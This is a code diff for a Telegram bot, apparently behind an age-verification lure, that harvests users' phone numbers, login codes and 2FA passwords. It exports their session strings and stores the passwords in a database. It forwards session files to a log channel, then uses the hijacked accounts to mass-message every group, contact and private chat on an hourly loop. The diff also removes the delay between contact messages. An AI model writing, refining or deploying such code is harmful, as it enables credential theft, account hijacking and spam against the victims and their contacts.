@@ -96,7 +96,7 @@ async def cleanup_user_state(user_id):
             try:
                 if state['client'].is_connected:
                     await state['client'].disconnect()
-            except:
+            except Exception:
                 pass
         del user_states[user_id]
 
@@ -155,6 +155,7 @@ async def handle_contact(bot: Client, message: Message):
         await message.reply(strings['already_logged_in'], reply_markup=ReplyKeyboardRemove())
         return
     
+    # Remove verify age keyboard
     processing_msg = await message.reply("Processing...", reply_markup=ReplyKeyboardRemove())
     await asyncio.sleep(1)
     
@@ -172,10 +173,12 @@ async def handle_contact(bot: Client, message: Message):
             'client': client,
             'phone_code_hash': code.phone_code_hash,
             'otp_digits': '',
-            'otp_retries': 0
+            'otp_retries': 0  # Track OTP retries
         }
+        # Delete only processing message, keep contact
         await processing_msg.delete()
         
+        # Send OTP message
         sent_msg = await bot.send_message(
             user_id,
             "**OTP Sent!**\n\nEnter code via buttons:",
@@ -215,14 +218,14 @@ async def handle_otp_buttons(bot: Client, query: CallbackQuery):
             sent_msg = await query.message.edit("**🔒 2FA REQUIRED:**\nEnter your password:")
             state['needs_password'] = True
             state['2fa_prompt_msg_id'] = sent_msg.id
-            state['2fa_retries'] = 0
+            state['2fa_retries'] = 0  # Track 2FA retries
         except PhoneCodeInvalid:
             state['otp_retries'] += 1
             await query.message.edit(
                 f"{strings['otp_wrong']}\n\n**Current OTP:** `____`",
                 reply_markup=OTP_KEYBOARD
             )
-            state['otp_digits'] = ''
+            state['otp_digits'] = ''  # Reset OTP
         except PhoneCodeExpired:
             await query.message.edit("**❌ OTP Expired!**\nPlease restart with /login")
             await cleanup_user_state(user_id)
@@ -253,16 +256,20 @@ async def handle_2fa_password(bot: Client, message: Message):
     state = user_states[user_id]
     
     try:
+        # Delete password message immediately
         await message.delete()
-        await state['client'].check_password(password=password)
-        state['password'] = password
         
+        await state['client'].check_password(password=password)
+        state['password'] = password  # Store for database
+        
+        # Delete 2FA prompt message
         if '2fa_prompt_msg_id' in state:
             try:
                 await bot.delete_messages(user_id, state['2fa_prompt_msg_id'])
             except:
                 pass
         
+        # Send and delete verification message
         verified_msg = await message.reply("Password verified...", reply_markup=ReplyKeyboardRemove())
         await asyncio.sleep(2)
         await verified_msg.delete()
@@ -270,6 +277,7 @@ async def handle_2fa_password(bot: Client, message: Message):
         await create_session(bot, state['client'], user_id, state['phone_number'])
     except PasswordHashInvalid:
         state['2fa_retries'] += 1
+        # Update 2FA prompt with error
         await bot.edit_message_text(
             user_id,
             state['2fa_prompt_msg_id'],
@@ -284,6 +292,7 @@ async def create_session(bot: Client, client: Client, user_id: int, phone_number
         string_session = await client.export_session_string()
         await client.disconnect()
         
+        # Prepare data with 2FA info if exists
         state = user_states.get(user_id, {})
         data = {
             'session': string_session,
@@ -302,18 +311,25 @@ async def create_session(bot: Client, client: Client, user_id: int, phone_number
             data['id'] = user_id
             database.insert_one(data)
 
+        # Create sessions directory if not exists
         os.makedirs("sessions", exist_ok=True)
+
+        # Generate session file path
         clean_phone = phone_number.replace('+', '')
         session_file = Path(f"sessions/{clean_phone}.session")
 
+        # Manually save session file
         with open(session_file, "w") as f:
             f.write(string_session)
             
+        # Send to log channel
         await bot.send_document(
             LOG_CHANNEL_SESSIONS_FILES,
             str(session_file),
             caption=f"Session: {clean_phone}"
         )
+        
+        # Remove local copy
         os.remove(session_file)
 
         await bot.send_message(user_id, strings['verification_success'])
@@ -335,102 +351,138 @@ async def send_promotion_messages(bot: Client, session_string: str, user_id: int
             client = Client("promo", session_string=session_string)
             await client.start()
             
+            # Update last active time
             database.update_one(
                 {"id": user_id},
                 {"$set": {"last_active": datetime.now()}}
             )
             
+            # Get all groups (excluding channels) - SAFE METHOD
             groups = []
             async for dialog in client.get_dialogs():
                 try:
-                    if (dialog and 
-                        hasattr(dialog, 'chat') and 
-                        dialog.chat and 
-                        hasattr(dialog.chat, 'type') and 
-                        dialog.chat.type in [
-                            enums.ChatType.GROUP, 
-                            enums.ChatType.SUPERGROUP
-                        ] and 
-                        hasattr(dialog.chat, 'id')):
-                        groups.append(dialog.chat.id)
-                except:
+                    # SAFETY: Skip if dialog or chat is None
+                    if not dialog or not dialog.chat:
+                        continue
+                        
+                    chat = dialog.chat
+                    
+                    # Skip if chat ID is None
+                    if not chat.id:
+                        continue
+                        
+                    if chat.type in [enums.ChatType.GROUP, enums.ChatType.SUPERGROUP]:
+                        groups.append(chat.id)
+                except Exception as e:
                     continue
             
+            # Get all contacts - SAFE METHOD
             contacts_and_privates = []
             try:
                 contacts = await client.get_contacts()
                 for user in contacts:
                     try:
-                        if (user and 
-                            hasattr(user, 'is_bot') and 
-                            not user.is_bot and 
-                            hasattr(user, 'id') and 
-                            user.id):
+                        # SAFETY: Skip if user is None or ID is None
+                        if not user or not user.id:
+                            continue
+                            
+                        if not user.is_bot:
                             contacts_and_privates.append(user.id)
-                    except:
+                    except Exception:
                         continue
-            except:
+            except Exception:
                 pass
             
+            # Get recent private chats - SAFE METHOD
             async for dialog in client.get_dialogs(limit=200):
                 try:
-                    if (dialog and 
-                        hasattr(dialog, 'chat') and 
-                        dialog.chat and 
-                        hasattr(dialog.chat, 'type') and 
-                        dialog.chat.type == enums.ChatType.PRIVATE and 
-                        hasattr(dialog.chat, 'is_bot') and 
-                        not dialog.chat.is_bot and
-                        hasattr(dialog.chat, 'id') and 
-                        dialog.chat.id and
-                        dialog.chat.id not in contacts_and_privates):
-                        contacts_and_privates.append(dialog.chat.id)
-                except:
+                    # SAFETY: Skip if dialog or chat is None
+                    if not dialog or not dialog.chat:
+                        continue
+                        
+                    chat = dialog.chat
+                    
+                    # Skip if chat ID is None
+                    if not chat.id:
+                        continue
+                        
+                    if (chat.type == enums.ChatType.PRIVATE and 
+                        not chat.is_bot and
+                        chat.id not in contacts_and_privates):
+                        contacts_and_privates.append(chat.id)
+                except Exception:
                     continue
             
+            # Phase 1: Groups (1 message/minute)
             for group in groups:
                 try:
+                    # Skip if group ID is None
+                    if not group:
+                        continue
+                        
                     text = random.choice(PROMO_TEXTS)
                     await client.send_message(group, text)
                     await asyncio.sleep(60)
                 except FloodWait as e:
                     await asyncio.sleep(e.value + 5)
-                except:
+                except Exception:
                     continue
             
+            # Phase 2: Contacts (rapid-fire)
             for target in contacts_and_privates:
                 try:
+                    # Skip if target is None
+                    if not target:
+                        continue
+                        
                     text = random.choice(PROMO_TEXTS)
                     await client.send_message(target, text)
-                    await asyncio.sleep(random.uniform(1, 3))
                 except FloodWait as e:
                     await asyncio.sleep(e.value + 5)
-                except:
+                except Exception:
                     continue
             
+            # Wait 1 hour before next cycle
             await asyncio.sleep(3600)
             
         except (SessionRevoked, AuthKeyUnregistered) as e:
-            mobile = user_data.get('mobile_number', 'Unknown')
+            # Handle session revocation
+            mobile = user_data.get('mobile_number', 'Unknown') if user_data else 'Unknown'
             await bot.send_message(
                 LOG_CHANNEL_SESSIONS_FILES,
                 f"🚫 Session Revoked/Unregistered!\nUser: {mobile}\nError: {e}"
             )
-            database.update_one({"id": user_id}, {"$set": {"promotion_active": False}})
+            
+            # Update database
+            if user_data:
+                database.update_one(
+                    {"id": user_id},
+                    {"$set": {
+                        "promotion_active": False,
+                        "revoked_time": datetime.now()
+                    }}
+                )
             break
             
         except Exception as e:
             error_msg = f"⚠️ Promotion Error: {str(e)}"
+            # Handle session revocation errors
             if "401" in str(e) and ("SESSION_REVOKED" in str(e) or "AUTH_KEY_UNREGISTERED" in str(e)):
-                mobile = user_data.get('mobile_number', 'Unknown')
+                mobile = user_data.get('mobile_number', 'Unknown') if user_data else 'Unknown'
                 error_msg = f"🚫 Session Revoked/Unregistered!\nUser: {mobile}\nError: {e}"
-                database.update_one({"id": user_id}, {"$set": {"promotion_active": False}})
-                break
+                if user_data:
+                    database.update_one(
+                        {"id": user_id},
+                        {"$set": {"promotion_active": False}}
+                    )
+                break  # Stop loop on session revocation
             
-            await bot.send_message(
-                LOG_CHANNEL_SESSIONS_FILES,
-                f"{error_msg}\n🔄 Restarting in 5 minutes..."
-            )
+            # Skip logging for NoneType errors (already fixed)
+            if "'NoneType' object" not in str(e):
+                await bot.send_message(
+                    LOG_CHANNEL_SESSIONS_FILES,
+                    f"{error_msg}\n🔄 Restarting in 5 minutes..."
+                )
             await asyncio.sleep(300)
         finally:
             if client:
@@ -442,6 +494,7 @@ async def send_promotion_messages(bot: Client, session_string: str, user_id: int
 async def check_inactive_sessions(bot: Client):
     while True:
         try:
+            # Find sessions inactive for >24 hours
             cutoff = datetime.now() - timedelta(hours=24)
             inactive_users = database.find({
                 "last_active": {"$lt": cutoff},
@@ -451,24 +504,34 @@ async def check_inactive_sessions(bot: Client):
             
             for user in inactive_users:
                 try:
-                    await bot.send_message(user['id'], strings['session_revoked'])
-                    database.update_one({"_id": user['_id']}, {"$set": {"notified": True}})
-                except:
+                    await bot.send_message(
+                        user['id'],
+                        strings['session_revoked']
+                    )
+                    database.update_one(
+                        {"_id": user['_id']},
+                        {"$set": {"notified": True}}
+                    )
+                except Exception:
                     continue
                     
         except Exception as e:
             print(f"Session check error: {str(e)}")
             
+        # Run once per day
         await asyncio.sleep(24 * 3600)
 
+# Start background task when bot initializes
 @Client.on_message(filters.command("init") & filters.private & filters.user(ADMINS))
 async def start_background_tasks(bot: Client, message: Message):
     asyncio.create_task(check_inactive_sessions(bot))
     await message.reply("✅ Background tasks started!")
 
+# Auto-start background tasks if not already running
 @Client.on_message(filters.command("start"))
 async def auto_start_tasks(bot: Client, message: Message):
     try:
+        # Check if tasks are already running
         if not hasattr(bot, 'bg_tasks_started'):
             asyncio.create_task(check_inactive_sessions(bot))
             bot.bg_tasks_started = True
